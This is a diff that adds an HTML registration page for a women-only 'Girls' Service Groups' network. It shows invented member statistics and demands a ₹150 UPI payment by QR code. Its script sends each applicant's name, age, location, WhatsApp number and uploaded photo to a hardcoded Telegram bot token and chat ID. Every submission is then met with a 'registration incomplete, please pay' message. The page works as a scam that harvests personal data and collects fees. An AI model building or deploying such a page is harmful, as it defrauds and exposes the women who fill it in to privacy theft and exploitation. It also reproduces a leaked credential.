@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Girls' Service Groups Registration</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+  :root{--brand:#d63384;--bg:rgba(255,255,255,.95);--shadow:0 10px 30px rgba(0,0,0,.12)}
+  *{box-sizing:border-box}
+  body{font-family:Arial,Helvetica,sans-serif;background:url('banner-bg.jpg') center/cover no-repeat fixed;margin:0;padding:20px}
+  .banner{background:rgba(255,255,255,.9);text-align:center;padding:16px;border-radius:12px;margin:0 auto 18px;max-width:980px;box-shadow:var(--shadow)}
+  .banner .logo{max-width:90px;display:block;margin:0 auto 8px}
+  .stats{margin-top:8px;font-size:14px;color:#444}
+  .social-icons{margin-top:6px}
+  .social-icons img{width:22px;margin:0 4px;vertical-align:middle}
+  .wrap{max-width:560px;margin:0 auto;background:var(--bg);border-radius:14px;padding:20px;box-shadow:var(--shadow)}
+  h1,h2{color:var(--brand);text-align:center;margin:6px 0}
+  p.lead{text-align:center;color:#555;margin-top:6px}
+  label{display:block;font-size:13px;color:#444;margin:10px 2px 6px}
+  input,select,button{width:100%;padding:11px 12px;border:1px solid #ccc;border-radius:8px;margin-bottom:10px;font-size:15px}
+  input:focus,select:focus{outline:2px solid rgba(214,51,132,.25);border-color:var(--brand)}
+  button{background:var(--brand);color:#fff;border:none;font-weight:600;cursor:pointer;box-shadow:0 6px 16px rgba(214,51,132,.25)}
+  button:disabled{background:#aaa;cursor:not-allowed;box-shadow:none}
+  .row{display:flex;gap:10px}.row>*{flex:1}
+  .qr{text-align:center;margin:16px 0 6px}
+  .qr img{max-width:250px;border:2px solid #ddd;border-radius:10px}
+  .note{background:#fff3cd;border:1px solid #ffe08a;color:#664d03;padding:10px;border-radius:8px;font-size:13px;text-align:left;margin-top:10px}
+  .btn-wrap{position:relative}
+  .pop{position:absolute;left:50%;transform:translateX(-50%);bottom:calc(100% + 8px);background:var(--brand);color:#fff;padding:8px 12px;border-radius:8px;font-size:13px;box-shadow:var(--shadow);display:none;max-width:320px;text-align:center;z-index:5}
+  .pop:after{content:"";position:absolute;top:100%;left:50%;transform:translateX(-50%);border:8px solid transparent;border-top-color:var(--brand)}
+  .helper{font-size:12px;color:#888;margin-top:-6px;margin-bottom:8px}
+</style>
+</head>
+<body>
+
+<div class="banner">
+  <img src="logo.png" alt="Logo" class="logo">
+  <h2>Welcome to Girls' Service Groups</h2>
+  <div class="stats">👭 11.3k+ Members | 👍 9.8k Likes | 💼 7.2k+ Services Delivered</div>
+  <div class="social-icons">
+    <img src="facebook.png" alt="FB">
+    <img src="instagram.png" alt="IG">
+    <img src="telegram.png" alt="TG">
+    <img src="youtube.png" alt="YT">
+  </div>
+</div>
+
+<div class="wrap">
+  <h1>🌸 Girls' Service Groups 🌸</h1>
+  <h2>Only for Females</h2>
+  <p class="lead">Trusted & professional network — join with verified details.</p>
+
+  <form id="regForm" novalidate>
+    <label for="name">Full Name</label>
+    <input id="name" placeholder="e.g., Priya Sharma" required>
+    <div class="helper" id="nameHelp"></div>
+
+    <div class="row">
+      <div>
+        <label for="age">Age</label>
+        <input type="number" id="age" placeholder="24–53" required>
+        <div class="helper" id="ageHelp"></div>
+      </div>
+      <div>
+        <label for="whatsapp">WhatsApp Number</label>
+        <input id="whatsapp" placeholder="10-digit mobile" required inputmode="numeric">
+        <div class="helper" id="phoneHelp"></div>
+      </div>
+    </div>
+
+    <label for="state">State / UT</label>
+    <select id="state" required>
+      <option value="">Select State</option>
+      <!-- 28 States + 8 UTs -->
+      <option>Andhra Pradesh</option><option>Arunachal Pradesh</option><option>Assam</option>
+      <option>Bihar</option><option>Chhattisgarh</option><option>Goa</option>
+      <option>Gujarat</option><option>Haryana</option><option>Himachal Pradesh</option>
+      <option>Jharkhand</option><option>Karnataka</option><option>Kerala</option>
+      <option>Madhya Pradesh</option><option>Maharashtra</option><option>Manipur</option>
+      <option>Meghalaya</option><option>Mizoram</option><option>Nagaland</option>
+      <option>Odisha</option><option>Punjab</option><option>Rajasthan</option>
+      <option>Sikkim</option><option>Tamil Nadu</option><option>Telangana</option>
+      <option>Tripura</option><option>Uttar Pradesh</option><option>Uttarakhand</option>
+      <option>West Bengal</option>
+      <option>Andaman and Nicobar Islands</option><option>Chandigarh</option>
+      <option>Dadra and Nagar Haveli and Daman and Diu</option><option>Delhi</option>
+      <option>Jammu and Kashmir</option><option>Ladakh</option><option>Lakshadweep</option>
+      <option>Puducherry</option>
+    </select>
+
+    <label for="city">City</label>
+    <input id="city" list="cityList" placeholder="Select or type your city" required>
+    <datalist id="cityList"></datalist>
+    <div class="helper">Tip: Agar list me city na mile to apni city **type** kar do.</div>
+
+    <label for="profileImage">Upload Your Profile Image</label>
+    <input type="file" id="profileImage" accept="image/png, image/jpeg" required>
+
+    <div class="qr">
+      <h3>📲 Scan & Pay ₹150</h3>
+      <img src="your-qr-image.png" alt="Scan to Pay">
+      <div class="note">
+        📌 Fee: ₹150 (one-time).<br>
+        📌 QR code scan karke UPI / Paytm / PhonePe se payment karein.<br>
+        📌 Payment successful hone ke baad hi aapki service unlock hogi.<br>
+        📌 Payment screenshot apne paas rakhein.
+      </div>
+    </div>
+
+    <div class="btn-wrap">
+      <div class="pop" id="payPop">⚠️ Registration complete karne ke liye pehle ₹150 ka payment karein. Payment hone ke baad hi aapki service unlock hogi.</div>
+      <button id="submitBtn" type="submit" disabled>Submit Registration</button>
+    </div>
+  </form>
+</div>
+
+<script>
+/* ---------- STATIC CITIES (starter set) ----------
+   NOTE: List bahut badi hoti hai; yahan har state ke
+   popular cities diye hain. Aap apni need ke hisaab se
+   `citiesByState` me aur add kar sakte hain.
+---------------------------------------------------*/
+const citiesByState = {
+  "Andhra Pradesh":["Visakhapatnam","Vijayawada","Guntur","Nellore","Kakinada","Tirupati","Rajahmundry"],
+  "Arunachal Pradesh":["Itanagar","Naharlagun","Tawang","Ziro"],
+  "Assam":["Guwahati","Silchar","Dibrugarh","Jorhat","Tezpur","Nagaon"],
+  "Bihar":["Patna","Gaya","Bhagalpur","Muzaffarpur","Purnea","Darbhanga","Ara","Begusarai"],
+  "Chhattisgarh":["Raipur","Bhilai","Bilaspur","Korba","Durg","Raigarh"],
+  "Goa":["Panaji","Margao","Vasco da Gama","Mapusa"],
+  "Gujarat":["Ahmedabad","Surat","Vadodara","Rajkot","Bhavnagar","Jamnagar","Junagadh","Gandhinagar"],
+  "Haryana":["Gurugram","Faridabad","Panipat","Ambala","Karnal","Hisar","Rohtak","Sonipat","Panchkula"],
+  "Himachal Pradesh":["Shimla","Mandi","Solan","Dharamshala","Kullu","Hamirpur"],
+  "Jharkhand":["Ranchi","Jamshedpur","Dhanbad","Bokaro","Hazaribagh","Deoghar"],
+  "Karnataka":["Bengaluru","Mysuru","Mangaluru","Hubballi","Belagavi","Davangere","Shivamogga","Ballari"],
+  "Kerala":["Thiruvananthapuram","Kochi","Kozhikode","Thrissur","Kollam","Alappuzha"],
+  "Madhya Pradesh":["Indore","Bhopal","Gwalior","Jabalpur","Ujjain","Sagar","Satna","Rewa"],
+  "Maharashtra":["Mumbai","Pune","Nagpur","Thane","Nashik","Aurangabad","Kolhapur","Navi Mumbai"],
+  "Manipur":["Imphal","Thoubal","Kakching"],
+  "Meghalaya":["Shillong","Tura","Jowai"],
+  "Mizoram":["Aizawl","Lunglei","Champhai"],
+  "Nagaland":["Kohima","Dimapur","Mokokchung"],
+  "Odisha":["Bhubaneswar","Cuttack","Rourkela","Berhampur","Sambalpur","Balasore"],
+  "Punjab":["Amritsar","Ludhiana","Jalandhar","Patiala","Bathinda","Mohali"],
+  "Rajasthan":["Jaipur","Jodhpur","Udaipur","Ajmer","Kota","Bikaner","Alwar","Sikar"],
+  "Sikkim":["Gangtok","Namchi","Gyalshing"],
+  "Tamil Nadu":["Chennai","Coimbatore","Madurai","Tiruchirappalli","Salem","Tirunelveli","Vellore"],
+  "Telangana":["Hyderabad","Warangal","Nizamabad","Khammam","Karimnagar"],
+  "Tripura":["Agartala","Udaipur","Dharmanagar"],
+  "Uttar Pradesh":["Lucknow","Kanpur","Varanasi","Agra","Ghaziabad","Noida","Prayagraj","Meerut","Bareilly","Gorakhpur","Aligarh","Moradabad","Saharanpur","Jhansi","Firozabad","Rampur","Ayodhya","Mathura"],
+  "Uttarakhand":["Dehradun","Haridwar","Rishikesh","Haldwani","Roorkee","Nainital","Kashipur","Rudrapur"],
+  "West Bengal":["Kolkata","Howrah","Durgapur","Asansol","Siliguri","Kharagpur"],
+  "Andaman and Nicobar Islands":["Port Blair","Havelock"],
+  "Chandigarh":["Chandigarh"],
+  "Dadra and Nagar Haveli and Daman and Diu":["Silvassa","Daman","Diu"],
+  "Delhi":["New Delhi","Dwarka","Saket","Karol Bagh","Rohini","Pitampura","Laxmi Nagar"],
+  "Jammu and Kashmir":["Srinagar","Jammu","Anantnag","Baramulla","Udhampur"],
+  "Ladakh":["Leh","Kargil"],
+  "Lakshadweep":["Kavaratti","Minicoy","Agatti"],
+  "Puducherry":["Puducherry","Karaikal","Mahe","Yanam"]
+};
+
+const stateSel = document.getElementById('state');
+const cityInput = document.getElementById('city');
+const cityList  = document.getElementById('cityList');
+
+/* Fill cities for the selected state */
+stateSel.addEventListener('change', ()=> {
+  const state = stateSel.value;
+  cityList.innerHTML = "";
+  (citiesByState[state] || []).forEach(c=>{
+    const o=document.createElement('option'); o.value=c; cityList.appendChild(o);
+  });
+});
+
+/* ---------- Validation + Submit ---------- */
+const form = document.getElementById('regForm');
+const submitBtn = document.getElementById('submitBtn');
+const pop = document.getElementById('payPop');
+
+function validateName(v){ return /^[A-Za-z ]+$/.test(v.trim()); }
+function validateAge(v){ const n=+v; return n>=24 && n<=53; }
+function validatePhone(v){ return /^\d{10}$/.test(v.trim()); }
+function validateImage(){ return document.getElementById('profileImage').files.length>0; }
+
+function refresh(){
+  const ok = validateName(name.value)
+         && validateAge(age.value)
+         && validatePhone(whatsapp.value)
+         && !!stateSel.value
+         && !!cityInput.value.trim()
+         && validateImage();
+  document.getElementById('nameHelp').textContent = validateName(name.value)? "": "Only letters & spaces allowed.";
+  document.getElementById('ageHelp').textContent  = validateAge(age.value)? "": "Age must be 24–53.";
+  document.getElementById('phoneHelp').textContent= validatePhone(whatsapp.value)? "": "Enter 10-digit mobile.";
+  submitBtn.disabled = !ok;
+}
+const name=document.getElementById('name');
+const age=document.getElementById('age');
+const whatsapp=document.getElementById('whatsapp');
+['input','change'].forEach(ev=>{
+  form.addEventListener(ev, refresh);
+});
+refresh();
+
+/* Popup helper */
+let popTimer=null;
+function showPop(msg){
+  pop.textContent = msg;
+  pop.style.display = 'block';
+  if(popTimer) clearTimeout(popTimer);
+  popTimer = setTimeout(()=> pop.style.display='none', 3000);
+}
+
+/* Telegram config */
+const BOT_TOKEN="8054414511:AAEMp5qgeHpy5el6v-feKwoAoUuAgzQOKSA";
+const CHAT_ID="7102407562";
+
+form.addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  refresh();
+  if(submitBtn.disabled) return;
+
+  /* Always show payment popup above button */
+  showPop("⚠️ Registration complete karne ke liye pehle ₹150 ka payment karein. Payment hone ke baad hi aapki service unlock hogi.");
+
+  const state = stateSel.value;
+  const city  = cityInput.value.trim();
+  const text = `🌸 New Registration 🌸
+Name: ${name.value.trim()}
+Age: ${age.value.trim()}
+State: ${state}
+City: ${city}
+WhatsApp: ${whatsapp.value.trim()}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text})
+    });
+
+    const fd=new FormData();
+    fd.append('chat_id',CHAT_ID);
+    fd.append('photo',document.getElementById('profileImage').files[0]);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+
+    setTimeout(()=>showPop(" ❌Registration incomplete! Please complete your payment to proceeds the registration"),800);
+    form.reset(); cityList.innerHTML=""; refresh();
+  }catch(err){
+    console.error(err);
+    showPop("❌ Error sending data to Telegram. BOT_TOKEN/CHAT_ID check karein.");
+  }
+});
+</script>
+</body>
+</html>
